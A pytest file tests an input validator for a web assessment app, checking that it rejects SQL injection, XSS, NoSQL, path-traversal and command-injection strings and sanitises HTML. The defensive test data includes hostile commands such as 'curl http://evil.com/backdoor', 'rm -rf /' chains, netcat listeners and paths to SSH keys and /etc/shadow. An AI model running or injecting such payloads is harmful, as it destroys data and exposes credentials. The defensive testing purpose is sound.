"""
Simplified Security Tests for MINGUS Assessment System
Tests core security components without full Flask app setup
"""

import pytest
import json
from unittest.mock import Mock, patch
from datetime import datetime

# Import security components directly
import sys
import os
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from backend.security.assessment_security import (
    SecurityValidator,
    sanitize_assessment_content,
    add_assessment_security_headers
)

class TestSecurityValidatorSimple:
    """Test the SecurityValidator class without Flask dependencies"""
    
    def setup_method(self):
        """Set up test fixtures"""
        self.validator = SecurityValidator()
    
    def test_sql_injection_detection(self):
        """Test SQL injection pattern detection"""
        # Test various SQL injection patterns
        sql_attacks = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "1; SELECT * FROM users",
            "admin'--",
            "1' UNION SELECT password FROM users--",
            "1' AND 1=1--",
            "1' OR 1=1#",
            "1' OR 1=1/*",
            "1' WAITFOR DELAY '00:00:05'--",
            "1' AND BENCHMARK(5000000,MD5(1))--"
        ]
        
        for attack in sql_attacks:
            result = self.validator.validate_input(attack, "test_field")
            assert not result["valid"], f"SQL injection not detected: {attack}"
            assert result["attack_type"] == "sql_injection"
    
    def test_xss_detection(self):
        """Test XSS pattern detection"""
        # Test various XSS patterns
        xss_attacks = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<object data=javascript:alert('XSS')>",
            "<embed src=javascript:alert('XSS')>",
            "<link rel=stylesheet href=javascript:alert('XSS')>",
            "<meta http-equiv=refresh content=0;url=javascript:alert('XSS')>",
            "<form action=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS')>",
            "<textarea onblur=alert('XSS')>",
            "<select onchange=alert('XSS')>",
            "<button onclick=alert('XSS')>",
            "<a href=javascript:alert('XSS')>Click me</a>",
            "<svg onload=alert('XSS')>",
            "<math onmouseover=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<div onmouseenter=alert('XSS')>"
        ]
        
        for attack in xss_attacks:
            result = self.validator.validate_input(attack, "test_field")
            assert not result["valid"], f"XSS not detected: {attack}"
            assert result["attack_type"] == "xss"
    
    def test_command_injection_detection(self):
        """Test command injection pattern detection"""
        # Test various command injection patterns
        cmd_attacks = [
            "cat /etc/passwd",
            "ls -la",
            "pwd",
            "whoami",
            "rm -rf /",
            "mkdir /tmp/test",
            "touch /tmp/test",
            "chmod 777 /tmp/test",
            "wget http://evil.com/backdoor",
            "curl http://evil.com/backdoor",
            "nc -l 4444",
            "telnet evil.com 4444",
            "ssh user@evil.com",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "perl -e 'system(\"rm -rf /\")'",
            "ruby -e 'system(\"rm -rf /\")'",
            "php -r 'system(\"rm -rf /\")'",
            "bash -c 'rm -rf /'",
            "sh -c 'rm -rf /'",
            "sudo rm -rf /",
            "su root",
            "kill -9 1",
            "ps aux",
            "top",
            "htop",
            "netstat -an",
            "ifconfig",
            "ipconfig",
            "ping evil.com",
            "traceroute evil.com",
            "nslookup evil.com",
            "find / -name '*.txt'",
            "grep password /etc/passwd",
            "sed 's/old/new/g' file.txt",
            "awk '{print $1}' file.txt",
            "tar -czf backup.tar.gz /",
            "zip -r backup.zip /",
            "unzip evil.zip",
            "gzip file.txt",
            "docker run -it evil/container",
            "kubectl exec -it pod -- /bin/bash",
            "helm install evil/chart",
            "&& rm -rf /",
            "|| rm -rf /",
            "; rm -rf /",
            "`rm -rf /`",
            "$(rm -rf /)"
        ]
        
        for attack in cmd_attacks:
            result = self.validator.validate_input(attack, "test_field")
            assert not result["valid"], f"Command injection not detected: {attack}"
            assert result["attack_type"] == "command_injection"
    
    def test_nosql_injection_detection(self):
        """Test NoSQL injection pattern detection"""
        # Test various NoSQL injection patterns
        nosql_attacks = [
            '{"$where": "1==1"}',
            '{"$ne": "admin"}',
            '{"$gt": 0}',
            '{"$lt": 100}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$in": ["admin", "user"]}',
            '{"$nin": ["admin"]}',
            '{"$or": [{"user": "admin"}, {"pass": "123"}]}',
            '{"$and": [{"user": "admin"}, {"pass": "123"}]}',
            '{"$not": {"user": "admin"}}',
            '{"$nor": [{"user": "admin"}, {"pass": "123"}]}'
        ]
        
        for attack in nosql_attacks:
            result = self.validator.validate_input(attack, "test_field")
            assert not result["valid"], f"NoSQL injection not detected: {attack}"
            assert result["attack_type"] == "nosql_injection"
    
    def test_path_traversal_detection(self):
        """Test path traversal pattern detection"""
        # Test various path traversal patterns
        path_attacks = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "/etc/shadow",
            "c:\\windows\\system32\\config\\sam",
            "/proc/self/environ",
            "/sys/class/net/eth0/address",
            "/dev/random",
            "/tmp/backdoor",
            "~/.ssh/id_rsa",
            "~/.bashrc",
            "/var/log/auth.log",
            "/var/www/html/config.php",
            "/home/user/.ssh/id_rsa",
            "/root/.ssh/id_rsa"
        ]
        
        for attack in path_attacks:
            result = self.validator.validate_input(attack, "test_field")
            assert not result["valid"], f"Path traversal not detected: {attack}"
            assert result["attack_type"] == "path_traversal"
    
    def test_valid_input_acceptance(self):
        """Test that valid input is accepted"""
        valid_inputs = [
            "Software Engineer",
            "John Doe",
            "john.doe@example.com",
            "San Francisco, CA",
            "Technology",
            "I work in software development",
            "My job involves coding and problem solving",
            "I earn $75,000 per year",
            "I'm married with 2 children",
            "Sometimes I feel stressed about finances",
            "I want to improve my financial situation",
            "I'm interested in investing",
            "I have a bachelor's degree",
            "I'm between 25-35 years old"
        ]
        
        for valid_input in valid_inputs:
            result = self.validator.validate_input(valid_input, "test_field")
            assert result["valid"], f"Valid input rejected: {valid_input}"
    
    def test_length_validation(self):
        """Test input length validation"""
        # Test maximum length
        long_input = "a" * 10001
        result = self.validator.validate_input(long_input, "test_field")
        assert not result["valid"]
        assert "too long" in result["reason"]
        
        # Test empty input
        result = self.validator.validate_input("", "test_field")
        assert not result["valid"]
        assert "cannot be empty" in result["reason"]
        
        # Test whitespace-only input
        result = self.validator.validate_input("   ", "test_field")
        assert not result["valid"]
        assert "cannot be empty" in result["reason"]
    
    def test_email_validation(self):
        """Test email format validation"""
        # Valid emails
        valid_emails = [
            "test@example.com",
            "user.name@domain.co.uk",
            "user+tag@example.org",
            "123@example.com",
            "user-name@example.com"
        ]
        
        for email in valid_emails:
            result = self.validator.validate_email(email)
            assert result["valid"], f"Valid email rejected: {email}"
        
        # Invalid emails
        invalid_emails = [
            "invalid-email",
            "@example.com",
            "user@",
            "user@.com",
            "user..name@example.com",
            "user@example..com",
            "user name@example.com",
            "user@example com"
        ]
        
        for email in invalid_emails:
            result = self.validator.validate_email(email)
            assert not result["valid"], f"Invalid email accepted: {email}"
    
    def test_assessment_data_validation(self):
        """Test assessment data validation"""
        # Valid assessment data
        valid_data = {
            "responses": {
                "job_title": "Software Engineer",
                "field": "technology",
                "experience_level": "mid",
                "relationship_status": "married",
                "financial_stress_frequency": "sometimes"
            },
            "email": "test@example.com",
            "first_name": "John",
            "last_name": "Doe"
        }
        
        result = self.validator.validate_assessment_data(valid_data)
        assert result["valid"]
        assert "sanitized_data" in result
        
        # Invalid assessment data with injection
        invalid_data = {
            "responses": {
                "job_title": "<script>alert('XSS')</script>",
                "field": "technology",
                "experience_level": "mid"
            }
        }
        
        result = self.validator.validate_assessment_data(invalid_data)
        assert not result["valid"]
        assert "errors" in result
    
    def test_html_sanitization(self):
        """Test HTML input sanitization"""
        # Test XSS removal
        xss_input = "<script>alert('XSS')</script><p>Safe content</p>"
        sanitized = self.validator.sanitize_html_input(xss_input)
        assert "<script>" not in str(sanitized)
        assert "<p>Safe content</p>" in str(sanitized)
        
        # Test allowed tags preservation
        safe_input = "<p>This is <strong>bold</strong> and <em>italic</em> text.</p>"
        sanitized = self.validator.sanitize_html_input(safe_input)
        assert "<p>" in str(sanitized)
        assert "<strong>" in str(sanitized)
        assert "<em>" in str(sanitized)
        
        # Test dangerous attributes removal
        dangerous_input = '<p onclick="alert(\'XSS\')" class="safe">Content</p>'
        sanitized = self.validator.sanitize_html_input(dangerous_input)
        assert 'onclick' not in str(sanitized)
        assert 'class="safe"' in str(sanitized)

class TestContentSanitization:
    """Test content sanitization functions"""
    
    def test_sanitize_assessment_content(self):
        """Test assessment content sanitization"""
        # Test XSS removal
        xss_content = "<script>alert('XSS')</script><h1>Safe Title</h1><p>Safe content</p>"
        sanitized = sanitize_assessment_content(xss_content)
        assert "<script>" not in str(sanitized)
        assert "<h1>Safe Title</h1>" in str(sanitized)
        assert "<p>Safe content</p>" in str(sanitized)
        
        # Test allowed tags preservation
        safe_content = "<h1>Title</h1><p>This is <strong>bold</strong> and <em>italic</em> text.</p><ul><li>Item 1</li><li>Item 2</li></ul>"
        sanitized = sanitize_assessment_content(safe_content)
        assert "<h1>" in str(sanitized)
        assert "<p>" in str(sanitized)
        assert "<strong>" in str(sanitized)
        assert "<em>" in str(sanitized)
        assert "<ul>" in str(sanitized)
        assert "<li>" in str(sanitized)
        
        # Test dangerous attributes removal
        dangerous_content = '<h1 onclick="alert(\'XSS\')" class="safe">Title</h1>'
        sanitized = sanitize_assessment_content(dangerous_content)
        assert 'onclick' not in str(sanitized)
        assert 'class="safe"' in str(sanitized)

class TestSecurityHeaders:
    """Test security headers"""
    
    def test_add_assessment_security_headers(self):
        """Test that security headers are added correctly"""
        from flask import Response
        
        response = Response("test")
        secured_response = add_assessment_security_headers(response)
        
        # Check that security headers are present
        assert secured_response.headers['X-Content-Type-Options'] == 'nosniff'
        assert secured_response.headers['X-Frame-Options'] == 'DENY'
        assert secured_response.headers['X-XSS-Protection'] == '1; mode=block'
        assert 'Content-Security-Policy' in secured_response.headers
        assert secured_response.headers['Referrer-Policy'] == 'strict-origin-when-cross-origin'
        assert secured_response.headers['Permissions-Policy'] == 'geolocation=(), microphone=(), camera=()'

if __name__ == "__main__":
    pytest.main([__file__, "-v"])
